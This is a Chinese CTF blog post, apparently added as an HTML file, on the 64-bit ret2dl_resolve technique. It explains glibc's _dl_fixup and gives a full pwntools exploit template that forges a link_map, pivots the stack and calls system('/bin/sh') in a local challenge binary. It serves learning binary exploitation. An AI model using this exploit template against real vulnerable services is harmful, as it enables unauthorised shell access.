@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"lazydaidai.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ret2dl_resolve">
+<meta property="og:type" content="article">
+<meta property="og:title" content="64位ret2dl_resolve一些个人理解">
+<meta property="og:url" content="https://lazydaidai.github.io/2021/02/10/2020/64%E4%BD%8Dret2dl_resolve%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/index.html">
+<meta property="og:site_name" content="DaiDai&#39;s blog">
+<meta property="og:description" content="ret2dl_resolve">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201104210332422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5l,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201104210628460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5l,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201104210838188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5l,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201104211150820.png#pic_center">
+<meta property="article:published_time" content="2021-02-10T07:55:06.000Z">
+<meta property="article:modified_time" content="2021-02-13T17:38:52.625Z">
+<meta property="article:author" content="DaiDai">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201104210332422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5l,size_16,color_FFFFFF,t_70#pic_center">
+
+<link rel="canonical" href="https://lazydaidai.github.io/2021/02/10/2020/64%E4%BD%8Dret2dl_resolve%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>64位ret2dl_resolve一些个人理解 | DaiDai's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">DaiDai's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://lazydaidai.github.io/2021/02/10/2020/64%E4%BD%8Dret2dl_resolve%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/me.jpg">
+      <meta itemprop="name" content="DaiDai">
+      <meta itemprop="description" content="never stop learning">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="DaiDai's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          64位ret2dl_resolve一些个人理解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-10 15:55:06" itemprop="dateCreated datePublished" datetime="2021-02-10T15:55:06+08:00">2021-02-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-02-14 01:38:52" itemprop="dateModified" datetime="2021-02-14T01:38:52+08:00">2021-02-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.9k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+            <div class="post-description">ret2dl_resolve</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="64位ret2dl-resolve一些个人理解"><a href="#64位ret2dl-resolve一些个人理解" class="headerlink" title="64位ret2dl_resolve一些个人理解"></a>64位ret2dl_resolve一些个人理解</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学32位ret2dl_resolve的时候就遗留了一个坑，64位该怎么搞。因为wiki上整个ELF的部分确实看上去很枯燥而且抓不住重点，就一直留到了现在，最近因为几个比赛题重新研究了一下。</p>
+<a id="more"></a>
+
+<h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>具体思路见参考文章，筛选的都是写的能让我看懂的了。对比模板发现思路都是一样的，这里只分析几个针对不同题目怎么改参数的问题以及坑点。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>通过阅读_dl_fixup源码可以总结出一般的函数重定向流程可简略如下：</p>
+<ol>
+<li>通过struct link_map *l获得.dynsym、.dynstr、.rel.plt地址</li>
+<li>通过reloc_arg+.rel.plt地址取得函数对应的Elf32_Rel指针，记作reloc</li>
+<li>通过reloc-&gt;r_info和.dynsym地址取得函数对应的Elf32_Sym指针，记作sym</li>
+<li>检查r_info最低位是否为7</li>
+<li>检查(sym-&gt;st_other)&amp;0x03是否为0</li>
+<li>通过strtab+sym-&gt;st_name获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数。</li>
+</ol>
+<p>利用方法：<br>让sym-&gt;st_value等于某个got上已经解析了的函数的那一表项，然后l-&gt;l_addr设置为system与这个函数的偏移值，此外，伪造link_map我们还需要伪造：位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针，另外strtab必须是个可读的地址，因此我们还需要伪造位于link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，在构造的过程中一般将reloc_arg作为0来进行构造。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>这是我用的exp模板，大部分参数已经给出了注释。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">&#x27;./pwn222&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b*0x04011AA&#x27;</span>) <span class="comment"># main ret</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">universal_gadget1 = <span class="number">0x00040122A</span> <span class="comment"># gadget_end</span></span><br><span class="line">universal_gadget2 = <span class="number">0x000401210</span> <span class="comment"># gadget_front</span></span><br><span class="line"> </span><br><span class="line">Elf64_Sym_len = <span class="number">0x18</span></span><br><span class="line">Elf64_Rela_len = <span class="number">0x18</span></span><br><span class="line">write_addr = <span class="number">0x404040</span> + <span class="number">0x440</span>  <span class="comment"># write to where</span></span><br><span class="line">log.info(<span class="string">&#x27;bss: &#x27;</span>+ <span class="built_in">hex</span>(elf.bss()))</span><br><span class="line"></span><br><span class="line">link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">rbp = write_addr-<span class="number">8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000401233</span></span><br><span class="line">leave = <span class="number">0x004011aa</span></span><br><span class="line">main = <span class="number">0x0401146</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = l+0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = l+0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = l+0xf8</span></span><br><span class="line"> </span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_link_map_gen</span>(<span class="params">link_map_addr,l_addr,st_value</span>):</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + <span class="number">0x18</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr = link_map_addr + <span class="number">8</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr = link_map_addr</span><br><span class="line">    fake_Elf64_Dyn_JMPREL = p64(<span class="number">0</span>) + p64(link_map_addr+<span class="number">0x28</span>)</span><br><span class="line">    fake_Elf64_Dyn_SYM = p64(<span class="number">0</span>) + p64(st_value-<span class="number">8</span>)</span><br><span class="line">    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    fake_link_map = p64(l_addr)            <span class="comment">#0x8</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_SYM    <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_JMPREL <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_rela       <span class="comment">#0x18</span></span><br><span class="line">    fake_link_map += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) <span class="comment">#link_map_addr + 0x68</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) <span class="comment">#link_map_addr + 0x70</span></span><br><span class="line">    fake_link_map += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)</span><br><span class="line">    <span class="keyword">return</span> fake_link_map</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_fake_link_map</span>(<span class="params">fake_link_map_addr,l_addr,st_value</span>):</span></span><br><span class="line">  <span class="comment"># 给出各个指针的假地址</span></span><br><span class="line">  fake_Elf64_Dyn_STR_addr = p64(fake_link_map_addr)</span><br><span class="line">  fake_Elf64_Dyn_SYM_addr = p64(fake_link_map_addr + <span class="number">0x8</span>)</span><br><span class="line">  fake_Elf64_Dyn_JMPREL_addr = p64(fake_link_map_addr + <span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># 伪造相关结构体</span></span><br><span class="line">  fake_Elf64_Dyn_SYM = flat(p64(<span class="number">0</span>),p64(st_value-<span class="number">8</span>))</span><br><span class="line">  fake_Elf64_Dyn_JMPREL = flat(p64(<span class="number">0</span>),p64(fake_link_map_addr+<span class="number">0x28</span>)  )<span class="comment"># JMPREL指向.rel.plt地址，放在fake_link_map_addr+0x28</span></span><br><span class="line">  r_offset = fake_link_map_addr - l_addr</span><br><span class="line">  log.info(<span class="string">&quot;r_offset :&quot;</span>+<span class="built_in">str</span>(<span class="built_in">hex</span>(r_offset)))</span><br><span class="line">  fake_Elf64_rela = flat(p64(r_offset),p64(<span class="number">7</span>),p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">  <span class="comment"># fake_link_map整体结构</span></span><br><span class="line">  fake_link_map = flat(   <span class="comment"># 0x0</span></span><br><span class="line">    p64(l_addr),          <span class="comment"># 0x8</span></span><br><span class="line">    fake_Elf64_Dyn_SYM,   <span class="comment"># 0x18</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL,<span class="comment"># 0x28</span></span><br><span class="line">    fake_Elf64_rela,      <span class="comment"># 0x40</span></span><br><span class="line">    <span class="string">&quot;\x00&quot;</span>*<span class="number">0x28</span>,         <span class="comment"># 0x68，下面开始放指针</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr,  <span class="comment"># STRTAB指针,0x70</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr,  <span class="comment"># SYMTAB指针,0x78</span></span><br><span class="line">    <span class="string">&quot;/bin/sh\x00&quot;</span>.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>),</span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr, <span class="comment"># JMPREL指针</span></span><br><span class="line">  )</span><br><span class="line">  <span class="keyword">return</span> fake_link_map</span><br><span class="line"></span><br><span class="line">fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span></span><br><span class="line">payload += p64(rbp)</span><br><span class="line">payload += p64(universal_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment">#pop rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(write_addr) <span class="comment">#pop r13</span></span><br><span class="line">payload += p64(<span class="built_in">len</span>(fake_link_map)+<span class="number">0x18</span>)  <span class="comment">#pop r14</span></span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])           <span class="comment">#pop r15</span></span><br><span class="line">payload += p64(universal_gadget2)  <span class="comment">#ret</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(main)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">fake_info = p64(<span class="number">0x00401026</span>)        <span class="comment">#jmp plt0+6</span></span><br><span class="line">fake_info += p64(link_map_addr)</span><br><span class="line">fake_info += p64(<span class="number">0</span>)</span><br><span class="line">fake_info += fake_link_map</span><br><span class="line"></span><br><span class="line">p.send(fake_info)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x20</span>+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+<span class="number">0x78</span>)+p64(leave)</span><br><span class="line"><span class="comment">#stack pivot,进入函数重定向</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>翻译几个以后我可能看不懂的注释：</p>
+<ol>
+<li>universal_gadget指64位通用gadget。</li>
+<li>plt0+6就是plt里第一个jmp，指向了got2,符合我们的利用思路。</li>
+</ol>
+<h2 id="调试与分析"><a href="#调试与分析" class="headerlink" title="调试与分析"></a>调试与分析</h2><p>断点断在了main函数的ret，直接c到这个断点，开始单步到这里。<br><img src="https://img-blog.csdnimg.cn/20201104210332422.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5l,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里在参考2最后提到了这个坑点，就是sub后rsp一定要落在可写范围内。可以vmmap一下rsp，如果距离bss还有一点距离，则需要修改exp种的write_addr增加上差值，就可以让rsp落到bss上了。<br>继续单步到这里：<br><img src="https://img-blog.csdnimg.cn/20201104210628460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5l,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>可以看到我们即将执行dl_fixup函数。参考1，2都提到了为了方便让reloc<br> = 0,这里可以证实这一点，我们si进入这个函数。<br> <img src="https://img-blog.csdnimg.cn/20201104210838188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tyMG5l,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>走到这儿我们能发现上面的cmp和这里的test，对应到之前分析的<br>“<br>4. 检查r_info最低位是否为7<br>5. 检查(sym-&gt;st_other)&amp;0x03是否为0<br>”<br>第一个check似乎挺容易过的，第二个check在参考1中提到了<br><img src="https://img-blog.csdnimg.cn/20201104211150820.png#pic_center" alt="在这里插入图片描述"><br>这道题这里我暂时还想不到怎么绕过，因为可用的got函数在libc的位置都在system的后面。通用的libc_start_main被当成全局变量存进来了，在参考1的例题中并没有这问题，如果为了理解还请完全按照参考1食用。这也算是一个新的坑点把。<br><del>至于如何应对这个问题，是否是可解决的，暂时留坑了，因为本菜鸡才学到堆，觉得这里已经可以知足了。</del><br>问了星盟的一位大师傅，得到了答复“只要找到一个固定的glibc的指针应该就好”。确实这样子就需要动调看能不能让(sym+5)&amp;0x03 != 0 了，通用性也大大降低，不过确实是一种思路。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>研究一些自认为超越当前水平的问题挺让人喜悦的，这个思路大概研究了两星期，有亿点感慨，希望以后自己也能保持这种钻研的心。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-253833.htm">https://bbs.pediy.com/thread-253833.htm</a></li>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/148073987">https://zhuanlan.zhihu.com/p/148073987</a></li>
+<li><a target="_blank" rel="noopener" href="https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">https://veritas501.space/2017/10/07/ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/10/2020/starCTF/" rel="prev" title="starctf">
+      <i class="fa fa-chevron-left"></i> starctf
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/10/2020/magic%20gadget/" rel="next" title="magic gadget">
+      magic gadget <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
